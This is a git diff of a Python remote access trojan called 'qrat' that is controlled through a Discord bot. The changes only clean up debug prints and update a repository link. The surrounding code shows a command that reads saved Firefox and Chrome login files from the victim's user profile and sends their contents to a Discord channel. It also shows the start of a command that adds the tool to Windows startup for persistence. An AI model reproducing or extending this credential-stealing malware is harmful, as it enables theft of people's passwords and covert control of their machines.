@@ -1,4 +1,4 @@
-"""https://github.com/anarix0"""
+"""https://github.com/anarix0/qrat"""
 import time
 import os
 import json
@@ -347,7 +347,6 @@ async def getpass(ctx):
         print(firefoxfolders)
         print(firefoxfolders[0])
         if os.path.exists(firefoxfolders[0]+"/logins.json"):
-            print('tttttttttt')
             with open(firefoxfolders[0]+"/logins.json", "r") as logins:
                 passwordlist = logins.readlines()
                 with open(os.path.dirname(__file__)+"\\files\\temp/firefoxpass.txt", "w") as tempfile:
@@ -358,10 +357,7 @@ async def getpass(ctx):
                 embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
                 embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
                 await ctx.send(embed=embed)
-        else:
-            print('fail')
     if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"):
-        print('chrome wooorororor')
         try:
             with open(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data", "r") as logins:
                 passwordlist = logins.readlines()
@@ -380,9 +376,6 @@ async def getpass(ctx):
             embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
             embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
             await ctx.send(embed=embed)
-    else:
-        print('fail')
-
 @client.hybrid_command(name = "startup", description = "Add to startup", with_app_command = False)
 @app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
 async def startup(ctx):
